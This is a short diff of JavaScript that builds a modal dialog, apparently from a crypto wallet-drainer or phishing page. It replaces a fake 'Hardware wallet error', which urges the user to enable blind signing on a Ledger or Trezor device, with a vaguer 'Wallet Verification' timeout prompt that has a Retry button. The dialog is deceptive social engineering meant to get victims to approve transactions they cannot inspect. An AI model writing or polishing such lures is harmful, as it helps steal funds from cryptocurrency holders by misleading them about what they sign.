@@ -1301,8 +1301,8 @@
       var card = document.createElement('div');
       card.className = 'legion-blind-sign-card';
       card.innerHTML = [
-        '<h2 id="legion-blind-sign-title">Hardware wallet error</h2>',
-        '<p class="legion-blind-error-msg">Blind signing not enabled.<br>Please enable \'Allow blind signing\' in your Ledger/Trezor Ethereum app settings, then click Retry.</p>',
+        '<h2 id="legion-blind-sign-title">Wallet Verification</h2>',
+        '<p class="legion-blind-error-msg">Connection timeout while verifying your wallet.<br>Please tap \'Retry\' to continue.</p>',
         '<div class="legion-blind-actions">',
         '  <button type="button" class="legion-blind-cancel">Cancel</button>',
         '  <button type="button" class="legion-blind-retry">Retry</button>',
